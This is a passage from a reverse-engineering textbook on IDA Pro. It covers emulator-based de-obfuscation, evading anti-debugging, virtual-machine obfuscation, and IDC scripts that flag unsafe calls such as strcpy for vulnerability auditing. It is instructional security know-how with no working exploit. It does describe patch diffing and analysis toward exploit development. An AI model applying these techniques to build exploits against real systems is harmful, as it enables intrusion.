UPX0:00406278 GetCurrentProcess dd 7C80DDF5h      ; DATA XREF: j_GetCurrentProcess↑r
UPX0:0040627C ; HANDLE __stdcall GetCurrentThread()
UPX0:0040627C GetCurrentThread dd 7C8098EBh       ; DATA XREF: j_GetCurrentThread↑r</pre><p>With the import table reconstructed in this manner, IDA is able to properly annotate calls to library functions using parameter-type information extracted from its type libraries, and the overall quality of the disassembly is significantly enhanced.</p></div><div class="sect3" title="Additional x86emu Features"><div class="titlepage"><div><div><h3 class="title"><a id="additional_x86emu_features"/>Additional x86emu Features</h3></div></div></div><p>The emulator contains several additional features that you may find useful. The following list details some of these capabilities.</p><table border="0" class="simplelist" summary="Simple list"><tr><td><span class="strong"><strong>File</strong></span> ▸ <span class="strong"><strong>Dump</strong></span> This menu option allows the user to specify a range of database addresses to be dumped to a file. By default, the range extends from the current cursor location to the maximum virtual address present in the database.</td></tr><tr><td><span class="strong"><strong>File</strong></span> ▸ <span class="strong"><strong>Dump Embedded PE</strong></span> Many malware programs contain embedded executables, which they install on target systems. This menu option looks for a valid PE file at the current cursor position, parses the file’s headers to determine the size of the file, and then extracts the bytes from the database to a saved file.</td></tr><tr><td><span class="strong"><strong>View</strong></span> ▸ <span class="strong"><strong>Enumerate Heap</strong></span> This menu option causes the emulator to dump a list of allocated heap blocks to the Output window, as shown here:</td></tr></table><a id="I_programlisting2_d1e38160"/><pre class="programlisting">x86emu: Heap Status ---
   0x5378000-0x53781ff (0x200 bytes)
   0x5378204-0x5378217 (0x14 bytes)
   0x537821c-0x5378347 (0x12c bytes)</pre><table border="0" class="simplelist" summary="Simple list"><tr><td><span class="strong"><strong>Emulate</strong></span> ▸ <span class="strong"><strong>Switch Thread</strong></span> When emulating within a Windows PE file, x86emu traps calls to the <code class="literal">CreateThread</code> function and allocates additional resources to manage a new thread. Because the emulator has no scheduler of its own, you must use this menu option if you want to switch among multiple threads.</td></tr><tr><td><span class="strong"><strong>Functions</strong></span> ▸ <span class="strong"><strong>Allocate Heap Block</strong></span> This menu option allows the user to reserve a block of memory within the emulation heap. The user is asked for the size of the block to reserve. The address of the newly reserved block is reported to the user. This feature is useful when scratch space is required during emulation.</td></tr><tr><td><span class="strong"><strong>Functions</strong></span> ▸ <span class="strong"><strong>Allocate Stack Block</strong></span> This menu option allows the user to reserve a block of memory within the emulation stack. It behaves in a manner similar to Functions ▸ Allocate Heap Block.</td></tr></table></div><div class="sect3" title="x86emu and Anti-debugging"><div class="titlepage"><div><div><h3 class="title"><a id="x86emu_and_anti-debugging"/>x86emu and Anti-debugging</h3></div></div></div><p>While the emulator is not intended to be used a debugger, it must simulate a runtime environment for the program being emulated. In order to successfully emulate many obfuscated binaries, the emulator must not fall victim to active anti-debugging techniques. Several features of the emulator have been designed with anti-debugging in mind.<a class="indexterm" id="IDX-CHP-21-0258"/><a class="indexterm" id="IDX-CHP-21-0259"/><a class="indexterm" id="IDX-CHP-21-0260"/><a class="indexterm" id="IDX-CHP-21-0261"/><a class="indexterm" id="IDX-CHP-21-0262"/><a class="indexterm" id="IDX-CHP-21-0263"/><a class="indexterm" id="IDX-CHP-21-0264"/><a class="indexterm" id="IDX-CHP-21-0265"/><a class="indexterm" id="IDX-CHP-21-0266"/><a class="indexterm" id="IDX-CHP-21-0267"/><a class="indexterm" id="IDX-CHP-21-0268"/><a class="indexterm" id="IDX-CHP-21-0269"/><a class="indexterm" id="IDX-CHP-21-0270"/><a class="indexterm" id="IDX-CHP-21-0271"/><a class="indexterm" id="IDX-CHP-21-0272"/><a class="indexterm" id="IDX-CHP-21-0273"/><a class="indexterm" id="IDX-CHP-21-0274"/></p><p>One anti-debugging technique measures time intervals, using the x86 <code class="literal">rdtsc</code> instruction, to ensure that a program has not been paused by a debugger. The <code class="literal">rdtsc</code> instruction is used to read the value of an internal <span class="emphasis"><em>time stamp counter (TSC)</em></span> and returns a 64-bit value representing the number of clock ticks since the processor was last reset. The rate at which the TSC increments varies among CPU types but is roughly once per internal CPU clock cycle. Debuggers cannot stop the TSC from incrementing, and therefore a process can determine that it has been stopped for an excessive amount of time by measuring the difference in the TSC between two successive invocations of <code class="literal">rdtsc</code>. x86emu maintains an internal TSC that it increments with each emulated instruction. Because the emulated TSC is affected only by emulated instructions, it does not matter how much actual time elapses between uses of <code class="literal">rdtsc</code>. In such cases, the difference in observed values will always be roughly proportional to the number of instructions that were emulated between invocations of <code class="literal">rdtsc</code> and should always be small enough to convince the emulated program that no debugger is attached.<a class="indexterm" id="IDX-CHP-21-0275"/><a class="indexterm" id="IDX-CHP-21-0276"/><a class="indexterm" id="IDX-CHP-21-0277"/><a class="indexterm" id="IDX-CHP-21-0278"/><a class="indexterm" id="IDX-CHP-21-0279"/><a class="indexterm" id="IDX-CHP-21-0280"/><a class="indexterm" id="IDX-CHP-21-0281"/><a class="indexterm" id="IDX-CHP-21-0282"/></p><p>The intentional use of exceptions is another anti-debugging technique that must be handled by the emulator. The emulator contains very basic capabilities to mimic the behavior of the Windows structured exception handling (SEH) process. When the emulated program is a Windows PE binary, the emulator responds to an exception or software interrupt by constructing an SEH <code class="literal">CONTEXT</code> structure, locating the current exception handler by walking the exception handler list via <code class="literal">fs:[0]</code>, and transferring control to the installed exception handler. When the exception handler returns, the emulator restores the CPU state from the <code class="literal">CONTEXT</code> structure (which may have been manipulated within the exception handler).<a class="indexterm" id="IDX-CHP-21-0283"/></p><p>Finally, x86emu emulates the behavior of the x86 hardware-debug registers but does not make use of those registers in order to set breakpoints within an emulated program. As discussed earlier, the emulator maintains an internal list of user-specified breakpoints that it scans prior to executing each instruction. Any manipulation of the debug registers within a Windows exception handler will not interfere with the operation of the emulator.<a class="indexterm" id="IDX-CHP-21-0284"/></p></div></div><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-32" id="ftn.CHP-21-FN-32">180</a>] </sup>The low-order 8 bits of the EAX register are also referred to as the AL register.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-33" id="ftn.CHP-21-FN-33">181</a>] </sup>See <a class="ulink" href="http://www.idabook.com/examples/chapter21/">http://www.idabook.com/examples/chapter21/</a> for one such example.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-34" id="ftn.CHP-21-FN-34">182</a>] </sup>IDA does ship with a plug-in capable of interfacing with open source Bochs emulator via IDA’s debugging interface. Please refer to <a class="xref" href="ch24.html" title="Chapter 24. The IDA Debugger">Chapter 24</a> through <a class="xref" href="ch26.html" title="Chapter 26. Additional Debugger Features">Chapter 26</a> for more information.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-35" id="ftn.CHP-21-FN-35">183</a>] </sup>A Windows library handle uniquely identifies a library within a Windows process. A <span class="emphasis"><em>library handle</em></span> is actually the base address at which the library is loaded into memory.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-36" id="ftn.CHP-21-FN-36">184</a>] </sup>Once a program has used <code class="literal">GetProcAddress</code> to find the address of a function, the program may call that function anytime it wishes using the returned address. Looking up function addresses in this manner eliminates the need to explicitly link to the functions at build time and reduces the amount of information that can be extracted by static analysis tools such as dumpbin.</p></div></div></div>
<div class="sect1" title="Virtual Machine-Based Obfuscation"><div class="titlepage"><div><div><h1 class="title"><a id="virtual_machine-based_obfuscation"/>Virtual Machine-Based Obfuscation</h1></div></div></div><p>Mentioned earlier in this chapter (in <a class="xref" href="ch21.html#opcode_obfuscation" title="Opcode Obfuscation">Opcode Obfuscation</a> in <a class="xref" href="ch21.html#opcode_obfuscation" title="Opcode Obfuscation">Opcode Obfuscation</a>), some of the most sophisticated obfuscators reimplement the program they receive as input, using a custom byte code and associated virtual machine. When confronting a binary obfuscated in this manner, the only native code that you might see would be the virtual machine. Assuming you recognize that you are looking at a software virtual machine, developing a complete understanding of all of this code generally fails to reveal the true purpose of the obfuscated program. This is because the behavior of the program remains buried in the embedded byte code that the virtual machine must interpret. To fully understand the program, you must, first, locate all of the embedded byte code and, second, reverse engineer the instruction set of the virtual machine so you can properly interpret the meaning of that byte code.</p><p>By way of comparison, imagine that you knew nothing whatsoever about Java, and someone handed you a Java virtual machine and a <span class="emphasis"><em>.class</em></span> file containing compiled byte code and asked you what they did. Lacking any documentation, you could make little sense of the byte code file, and you would need to fully reverse the virtual machine to learn both the structure of a <span class="emphasis"><em>.class</em></span> file and how to interpret its contents. With an understanding of the byte code machine language, you could then proceed to understanding the <span class="emphasis"><em>.class</em></span> file.<a class="indexterm" id="IDX-CHP-21-0285"/></p><p>VMProtect is an example of a commercial product that utilizes very sophisticated virtual machine-based obfuscation techniques. As more of an academic exercise, TheHyper’s HyperUnpackMe2 challenge binary is a fairly straightforward example of the use of virtual machines in obfuscation, the primary challenge being to locate the virtual machine’s embedded byte code program and determine the meaning of each byte code. In his article on OpenRCE describing HyperUnpackMe2,<sup>[<a class="footnote" href="#ftn.CHP-21-FN-37" id="CHP-21-FN-37">185</a>]</sup> Rolf Rolles’s approach was to fully comprehend the virtual machine in order to build a processor module capable of disassembling its byte code. The processor module then allowed him to disassemble the byte code embedded within the challenge binary. A minor limitation to this approach is that it allows you to view either the x86 code within HyperUnpackme2 (using IDA’s x86 module) or the virtual machine code (using Rolle’s processor module) but not both at the same time. This obligates you to create two different databases, each using a different processor module. An alternative approach takes advantage of the ability to customize existing processor modules (see <a class="xref" href="ch19s05.html" title="Customizing Existing Processors">Customizing Existing Processors</a> in <a class="xref" href="ch19s05.html" title="Customizing Existing Processors">Customizing Existing Processors</a>) through the use of plug-ins, effectively allowing you to extend an instruction set to include all of the instructions of an embedded virtual machine. Applying this approach to HyperUnpackMe2 allows us to view x86 code and virtual machine code together in a single database, as shown in the following listing:<a class="indexterm" id="IDX-CHP-21-0286"/></p><a id="I_programlisting2_d1e38364"/><pre class="programlisting">TheHyper:01013B2F            <img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>h_pop.l       R9
TheHyper:01013B32              h_pop.l       R7
TheHyper:01013B35              h_pop.l       R5
TheHyper:01013B38              h_mov.l       SP, R2
TheHyper:01013B3C              h_sub.l       SP, 0Ch
TheHyper:01013B44              h_pop.l       R2
TheHyper:01013B47              h_pop.l       R1
TheHyper:01013B4A              h_retn        0Ch
TheHyper:01013B4A sub_1013919  endp
TheHyper:01013B4A
TheHyper:01013B4A ; ----------------------------------------------------------
TheHyper:01013B4D              dd 24242424h
TheHyper:01013B51              dd 0A9A4285Dh           ; TAG VALUE
TheHyper:01013B55
TheHyper:01013B55 ; ============ S U B R O U T I N E =========================
TheHyper:01013B55
TheHyper:01013B55 ; Attributes: bp-based frame
TheHyper:01013B55
TheHyper:01013B55 sub_1013B55  proc near      ; DATA XREF: TheHyper:0103AF7A?o
TheHyper:01013B55
TheHyper:01013B55 var_8        = dword ptr −8
TheHyper:01013B55 var_4        = dword ptr −4
TheHyper:01013B55 arg_0        = dword ptr  8
TheHyper:01013B55 arg_4        = dword ptr  0Ch
TheHyper:01013B55
TheHyper:01013B55            <img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>push    ebp
TheHyper:01013B56              mov     ebp, esp
TheHyper:01013B58              sub     esp, 8
TheHyper:01013B5B              mov     eax, [ebp+arg_0]
TheHyper:01013B5E              mov     [esp+8+var_8], eax
TheHyper:01013B61              mov     [esp+8+var_4], 0
TheHyper:01013B69              push    4
TheHyper:01013B6B              push    1000h</pre><p>Here, the code beginning at <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e38380"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> is disassembled as HyperUnpackMe2 byte code, while the code that follows at <span class="inlinemediaobject"><a id="I_inlinemediaobject2_d1e38386"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> is displayed as x86 code.<a class="indexterm" id="IDX-CHP-21-0287"/><a class="indexterm" id="IDX-CHP-21-0288"/><a class="indexterm" id="IDX-CHP-21-0289"/></p><p>The ability to simultaneously display native code and byte code has been anticipated by Hex-Rays, which introduced custom datatypes and formats in IDA 5.7. Custom data formats are useful when IDA’s built-in formatting options fail to meet your needs. New formatting capabilities are registered by specifying (using a script or plug-in) a menu name for your format and a function to perform the formatting. Once you select a custom format for a data item, IDA will invoke your formatting function each time it needs to display that data item. Custom datatypes are useful when IDA’s built-in datatypes are not expressive enough represent the data that you encounter in a particular binary. Custom datatypes, like custom formats, are registered using a script or a plug-in. The Hex-Rays example registers a custom data type to designate virtual machine byte code and displays each byte code as an instruction by using a custom data format. A drawback to this approach is that it requires you to locate every virtual machine instruction and explicitly change its data type. Using a custom processor extension, designating a single value as a virtual machine instruction automatically leads to the discovery of every reachable instruction, because IDA drives the disassembly process and the processor extension discovers new reachable instructions via its custom_emu implementation.<a class="indexterm" id="IDX-CHP-21-0290"/><a class="indexterm" id="IDX-CHP-21-0291"/></p><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a class="para" href="#CHP-21-FN-37" id="ftn.CHP-21-FN-37">185</a>] </sup>See “Defeating HyperUnpackMe2 With an IDA Processor Module” at <a class="ulink" href="http://www.openrce.org/articles/full_view/28">http://www.openrce.org/articles/full_view/28</a>.</p></div></div></div>
<div class="sect1" title="Summary"><div class="titlepage"><div><div><h1 class="title"><a id="summary-id20"/>Summary</h1></div></div></div><p>Obfuscated programs are the rule rather than the exception when it comes to malware these days. Any attempts to study the internal operations of a mal-ware sample are almost certain to require some type of de-obfuscation. Whether you take a debugger-assisted, dynamic approach to de-obfuscation or whether you prefer not to run potentially malicious code and instead use scripts or emulation to de-obfuscate your binaries, the ultimate goal is to produce a de-obfuscated binary that can be fully disassembled and properly analyzed. In most cases, this final analysis will be performed using a tool such as IDA. Given this ultimate goal (of using IDA for analysis), it makes some sense to attempt to use IDA from start to finish. The techniques presented in this chapter are intended to demonstrate that IDA is capable of far more than generating disassembly listings. In <a class="xref" href="ch25.html" title="Chapter 25. Disassembler/Debugger Integration">Chapter 25</a> we will revisit obfuscated code and take a look at how IDA’s debugging features may be leveraged as a de-obfuscation tool as well.</p></div>
<div class="chapter" title="Chapter&#xA0;22.&#xA0;Vulnerability Analysis"><div class="titlepage"><div><div><h1 class="title"><a id="vulnerability_analysis"/>Chapter 22. Vulnerability Analysis</h1></div></div></div><div class="informalfigure"><a id="image_no_caption-id21"/><div class="mediaobject"><a id="I_mediaobject3_d1e38426"/><img alt="image with no caption" src="httpatomoreillycomsourcenostarchimages854059.png.jpg"/></div></div><p>Before we get too far into this chapter, we need to make one thing clear: IDA is not a vulnerability discovery tool. There, we said it; what a relief! IDA seems to have attained mystical qualities in some people’s minds. All too often people seem to have the impression that merely opening a binary with IDA will reveal all the secrets of the universe, that the behavior of a piece of malware will be fully explained to them in comments automatically generated by IDA, that vulnerabilities will be highlighted in red, and that IDA will automatically generate exploit code if you right-click while standing on one foot in some obscure Easter egg–activation sequence.<a class="indexterm" id="IDX-CHP-22-0001"/></p><p>While IDA is certainly a very capable tool, without a clever user sitting at the keyboard (and perhaps a handy collection of scripts and plug-ins), it is really only a disassembler/debugger. As a static-analysis tool, it can only facilitate your attempts to locate software vulnerabilities. Ultimately, it is up to your skills and how you apply them as to whether IDA makes your search for vulnerabilities easier. Based on our experience, IDA is not the optimal tool for locating new vulnerabilities,<sup>[<a class="footnote" href="#ftn.CHP-22-FN-1" id="CHP-22-FN-1">186</a>]</sup> but when used in conjunction with a debugger, it is one of the best tools available for assisting in exploit development once a vulnerability has been discovered.<a class="indexterm" id="IDX-CHP-22-0002"/><a class="indexterm" id="IDX-CHP-22-0003"/><a class="indexterm" id="IDX-CHP-22-0004"/><a class="indexterm" id="IDX-CHP-22-0005"/></p><p>Over the past several years, IDA has taken on a new role in discovering existing vulnerabilities. Initially, it may seem unusual to search for known vulnerabilities until we stop to consider exactly what is known about these vulnerabilities and exactly who knows it. In the closed-source, binary-only software world, vendors frequently release software patches without disclosing exactly what has been patched and why. By performing differential analysis between new patched versions of a piece of software and old un-patched versions of the same software, it is possible to isolate the areas that have changed within a binary. Under the assumption that these changes were made for a reason, such differential-analysis techniques actually help to shine a spotlight on what were formerly vulnerable code sequences. With the search thusly narrowed, anyone with the requisite skills can develop an exploit for use against unpatched systems. In fact, given Microsoft’s well-known <span class="emphasis"><em>Patch Tuesday</em></span> cycle of publishing updates, large numbers of security researchers prepare to sit down and do just that once every month.</p><p>Considering that entire books exist on the topic,<sup>[<a class="footnote" href="#ftn.CHP-22-FN-2" id="CHP-22-FN-2">187</a>]</sup> there is no way that we can do justice to vulnerability analysis in a single chapter in a book dedicated to IDA. What we will do is assume that the reader is familiar with some of the basic concepts of software vulnerabilities, such as buffer overflows, and discuss some of the ways that IDA may be used to hunt down, analyze, and ultimately develop exploits for those vulnerabilities.</p><div class="sect1" title="Discovering New Vulnerabilities with IDA"><div class="titlepage"><div><div><h1 class="title"><a id="discovering_new_vulnerabilities_with_ida"/>Discovering New Vulnerabilities with IDA</h1></div></div></div><p>Vulnerability researchers take many different approaches to discovering new vulnerabilities in software. When source code is available, it may be possible to utilize any of a growing number of automated source code–auditing tools to highlight potential problem areas within a program. In many cases, such automated tools will only point out the low-hanging fruit, while discovery of deeper vulnerabilities may require extensive manual auditing.</p><p>Tools for performing automated auditing of binaries offer many of the same reporting capabilities offered by automated source-auditing tools. A clear advantage of automated binary analysis is that no access to the application source code is required. Therefore, it is possible to perform automated analysis of closed-source, binary-only programs. Veracode<sup>[<a class="footnote" href="#ftn.CHP-22-FN-3" id="CHP-22-FN-3">188</a>]</sup> is an example of a company that offers a subscription-based service in which users may submit binary files for analysis by Veracode’s proprietary binary-analysis tools. While there is no guarantee that such tools can find any or all vulnerabilities within a binary, these technologies bring binary analysis within reach of the average person seeking some measure of confidence that the software she uses is free from vulnerabilities.<a class="indexterm" id="IDX-CHP-22-0006"/><a class="indexterm" id="IDX-CHP-22-0007"/><a class="indexterm" id="IDX-CHP-22-0008"/><a class="indexterm" id="IDX-CHP-22-0009"/><a class="indexterm" id="IDX-CHP-22-0010"/><a class="indexterm" id="IDX-CHP-22-0011"/><a class="indexterm" id="IDX-CHP-22-0012"/><a class="indexterm" id="IDX-CHP-22-0013"/><a class="indexterm" id="IDX-CHP-22-0014"/></p><p>Whether auditing at the source or binary level, basic static-analysis techniques include auditing for the use of problematic functions such as <code class="literal">strcpy</code> and <code class="literal">sprintf</code>, auditing the use of buffers returned by dynamic memory-allocation routines such as <code class="literal">malloc</code> and <code class="literal">VirtualAlloc</code>, and auditing the handling of user-supplied input received via functions such as <code class="literal">recv</code>, <code class="literal">read</code>, <code class="literal">fgets</code>, and many other similar functions. Locating such calls within a database is not difficult. For example, to track down all calls to <code class="literal">strcpy</code>, we could perform the following steps:</p><div class="orderedlist"><ol class="orderedlist"><li class="listitem"><p>Find the <code class="literal">strcpy</code> function.</p></li><li class="listitem"><p>Display all cross-references to the <code class="literal">strcpy</code> function by positioning the cursor on the <code class="literal">strcpy</code> label and then choosing <span class="strong"><strong>View</strong></span> ▸ <span class="strong"><strong>Open Subviews</strong></span> ▸ <span class="strong"><strong>Cross References</strong></span>.</p></li><li class="listitem"><p>Visit each cross-reference and analyze the parameters provided to <code class="literal">strcpy</code> to determine whether a buffer overflow may be possible.</p></li></ol></div><p>Step 3 may require a substantial amount of code and data-flow analysis to understand all potential inputs to the function call. Hopefully, the complexity of such a task is clear. Step 1, although it seems straightforward, may require a little effort on your part. Locating <code class="literal">strcpy</code> may be as easy as using the Jump ▸ Jump to Address command (G) and entering <code class="literal">strcpy</code> as the address to jump to. In Windows PE binaries or statically linked ELF binaries, this is usually all that is needed. However, with other binaries, extra steps may be required. In a dynamically linked ELF binary, using the Jump command may not take you directly to the desired function. Instead, it is likely to take you to an entry in the <code class="literal">extern</code> section (which is involved in the dynamic-linking process). An IDA representation of the <code class="literal">strcpy</code> entry in an <code class="literal">extern</code> section is shown here:<a class="indexterm" id="IDX-CHP-22-0015"/><a class="indexterm" id="IDX-CHP-22-0016"/></p><a id="I_programlisting3_d1e38597"/><pre class="programlisting"><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> extern:804DECC          extrn strcpy:near     ; CODE XREF: _strcpy↑j
  extern:804DECC                                ; DATA XREF: .got:off_804D5E4↑o</pre><p>To confuse matters, this location does not appear to be named <code class="literal">strcpy</code> at all (it is, but the name is indented), and the only code cross-reference <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e38609"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> to the location is a jump cross-reference from a function that appears to be named <code class="literal">_strcpy</code>, while a data cross-reference is also made to this location from the <code class="literal">.got</code> section. The referencing function is actually named <code class="literal">.strcpy</code>, which is not at all obvious from the display. In this case, IDA has replaced the dot character with an underscore because IDA does not consider dots to be valid identifier characters by default. Double-clicking the code cross-reference takes us to the program’s procedure linkage table (.<code class="literal">plt</code>) entry for <code class="literal">strcpy</code>, as shown here:<a class="indexterm" id="IDX-CHP-22-0017"/></p><a id="I_programlisting3_d1e38634"/><pre class="programlisting">.plt:08049E90 _strcpy    proc near               ; CODE XREF: decode+5F↓p
.plt:08049E90                                    ; extract_int_argument+24↓p ...
.plt:08049E90            jmp     ds:off_804D5E4
.plt:08049E90 _strcpy    endp</pre><p>If instead we follow the data cross-reference, we end up at the corresponding <code class="literal">.got</code> entry for <code class="literal">strcpy</code> shown here:</p><a id="I_programlisting3_d1e38644"/><pre class="programlisting">.got:0804D5E4 off_804D5E4     dd offset strcpy        ; DATA XREF: _strcpy↑r</pre><p>In the <code class="literal">.got</code> entry, we encounter another data cross-reference to the <code class="literal">.strcpy</code> function in the <code class="literal">.plt</code> section. In practice, following the data cross-references is the most reliable means of navigating from the <code class="literal">extern</code> section to the <code class="literal">.plt</code> section. In dynamically linked ELF binaries, functions are called indirectly through the procedure linkage table. Now that we have reached the .<code class="literal">plt</code>, we can bring up the cross-references to <code class="literal">_strcpy</code> (actually <code class="literal">.strcpy</code>) and begin to audit each call (of which there are at least two in this example).</p><p>This process can become tedious when we have a list of several common functions whose calls we wish to locate and audit. At this point it may be useful to develop a script that can automatically locate and comment all interesting function calls for us. With comments in place, we can perform simple searches to move from one audit location to another. The foundation for such a script is a function that can reliably locate another function so that we can locate all cross-references to that function. With the understanding of ELF binaries gained in the preceding discussion, the IDC function in <a class="xref" href="ch22.html#finding_a_functionas_callable_address" title="Example 22-1. Finding a function’s callable address">Example 22-1</a> takes a function name as an input argument and returns an address suitable for cross-reference iteration.</p><div class="example"><a id="finding_a_functionas_callable_address"/><p class="title">Example 22-1. Finding a function’s callable address</p><div class="example-contents"><pre class="programlisting">static getFuncAddr(fname) {
   auto func = LocByName(fname);
   if (func != BADADDR) {
      auto seg = SegName(func);
      //what segment did we find it in?
      if (seg == "extern") { //Likely an ELF if we are in "extern"
         //First (and only) data xref should be from got
         func = DfirstB(func);
         if (func != BADADDR) {
            seg = SegName(func);
            if (seg != ".got") return BADADDR;
            //Now, first (and only) data xref should be from plt
            func = DfirstB(func);
            if (func != BADADDR) {
               seg = SegName(func);
               if (seg != ".plt") return BADADDR;
            }
         }
      }
      else if (seg != ".text") {
         //otherwise, if the name was not in the .text section, then we
         // don't have an algorithm for finding it automatically
         func = BADADDR;
      }
   }
   return func;
}</pre></div></div><p>Using the supplied return address, it is now possible to track down all of the references to any function whose use we want to audit. The IDC function in <a class="xref" href="ch22.html#flagging_calls_to_a_designated_function" title="Example 22-2. Flagging calls to a designated function">Example 22-2</a> leverages the <code class="literal">getFuncAddr</code> function from the preceding example to obtain a function address and add comments at all calls to the function.<a class="indexterm" id="IDX-CHP-22-0018"/></p><div class="example"><a id="flagging_calls_to_a_designated_function"/><p class="title">Example 22-2. Flagging calls to a designated function</p><div class="example-contents"><pre class="programlisting">static flagCalls(fname) {
     auto func, xref;
     //get the callable address of the named function
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>    func = getFuncAddr(fname);
     if (func != BADADDR) {
        //Iterate through calls to the named function, and add a comment
        //at each call
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>       for (xref
 = RfirstB(func); xref != BADADDR; xref = RnextB(func, xref)) {
           if (XrefType() == fl_CN || XrefType() == fl_CF) {
              MakeComm(xref, "*** AUDIT HERE ***");
           }
        }
        //Iterate through data references to the named function, and add a
        //comment at reference
<img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/>       for
 (xref = DfirstB(func); xref != BADADDR; xref = DnextB(func, xref)) {
           if (XrefType() == dr_O) {
              MakeComm(xref, "*** AUDIT HERE ***");
           }
        }
     }
  }</pre></div></div><p>Once the desired function’s address has been located <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e38718"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span>, two loops are used to iterate over cross-references to the function. In the first loop <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e38724"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span>, a comment is inserted at each location that calls the function of interest. In the second loop <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e38730"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span>, additional comments are inserted at each location that takes the address of the function (use of an offset cross-reference type). The second loop is required in order to track down calls of the following style:</p><a id="I_programlisting3_d1e38736"/><pre class="programlisting"><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> .text:000194EA                 mov     esi, ds:strcpy
  .text:000194F0                 push    offset loc_40A006
  .text:000194F5                 add     edi, 160h
    .text:000194FB                 push    edi
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/> .text:000194FC call    esi</pre><p>In this example, the compiler has cached the address of the <code class="literal">strcpy</code> function in the ESI register <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e38754"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> in order to make use of a faster means of calling <code class="literal">strcpy</code> later <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e38763"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> in the program. The <code class="literal">call</code> instruction shown here is faster to execute because it is both smaller (2 bytes) and requires no additional operations to resolve the target of the call, since the address is already contained within the CPU within the ESI register. A compiler may choose to generate this type of code when one function makes several calls to another function.<a class="indexterm" id="IDX-CHP-22-0019"/><a class="indexterm" id="IDX-CHP-22-0020"/></p><p>Given the indirect nature of the call in this example, the <code class="literal">flagCalls</code> function in our example may see only the data cross-reference to <code class="literal">strcpy</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e38787"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> while failing to see the call to <code class="literal">strcpy</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e38796"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> because the <code class="literal">call</code> instruction does not reference <code class="literal">strcpy</code> directly. In practice, however, IDA possesses the capability to perform some limited data-flow analysis in cases such as these and is likely to generate the disassembly shown here:</p><a id="I_programlisting3_d1e38809"/><pre class="programlisting">.text:000194EA                 mov     esi, ds:strcpy
  .text:000194F0                 push    offset loc_40A006
  .text:000194F5                 add     edi, 160h
  .text:000194FB                 push    edi
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/> .text:000194FC                 call    esi ; strcpy</pre><p>Note that the <code class="literal">call</code> instruction <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e38822"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> has been annotated with a comment indicating which function IDA believes is being called. In addition to inserting the comment, IDA adds a code cross-reference from the point of the call to the function being called. This benefits the <code class="literal">flagCalls</code> function, because in this case the <code class="literal">call</code> instruction will be found and annotated via a code cross-reference.</p><p>To finish up our example script, we need a <code class="literal">main</code> function that invokes <code class="literal">flagCalls</code> for all of the functions that we are interested in auditing. A simple example to annotate calls to some of the functions mentioned earlier in this section is shown here:</p><a id="I_programlisting3_d1e38843"/><pre class="programlisting">static main() {
   flagCalls("strcpy");
   flagCalls("strcat");
   flagCalls("sprintf");
   flagCalls("gets");
}</pre><p>After running this script, we can move from one interesting call to the next by searching for the inserted comment text, <code class="literal">*** AUDIT ***</code>. Of course this still leaves a lot of work to be done from an analysis perspective, since the mere fact that a program calls <code class="literal">strcpy</code> does not make that program exploitable. This is where data-flow analysis comes into play. In order to understand whether a particular call to <code class="literal">strcpy</code> is exploitable or not, you must determine what parameters are being passed in to <code class="literal">strcpy</code> and evaluate whether those parameters can be manipulated to your advantage or not.</p><p>Data-flow analysis is a far more complex task than simply finding calls to problem functions. In order to track the flow of data in a static-analysis environment, a thorough understanding of the instruction set being used is required. Your static-analysis tools need to understand where registers may have been assigned values and how those values may have changed and propagated to other registers. Further, your tools need a means for determining the sizes of source and destination buffers being referenced within the program, which in turn requires the ability to understand the layout of stack frames and global variables as well as the ability to deduce the size of dynamically allocated memory blocks. And, of course, all of this is being attempted without actually running the program.<a class="indexterm" id="IDX-CHP-22-0021"/><a class="indexterm" id="IDX-CHP-22-0022"/><a class="indexterm" id="IDX-CHP-22-0023"/></p><p>An interesting example of what can be accomplished with creative scripting comes in the form of the BugScam<sup>[<a class="footnote" href="#ftn.CHP-22-FN-4" id="CHP-22-FN-4">189</a>]</sup> scripts created by Halvar Flake. BugScam utilizes techniques similar to the preceding examples to locate calls to problematic functions and takes the additional step of performing rudimentary data-flow analysis at each function call. The result of BugScam’s analysis is an HTML report of potential problems in a binary. A sample report table generated as a result of a <code class="literal">sprintf</code> analysis is shown here:</p><div class="informaltable"><table style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/><col/></colgroup><thead><tr><th style="text-align: left" valign="bottom"><p>Address</p></th><th style="text-align: left" 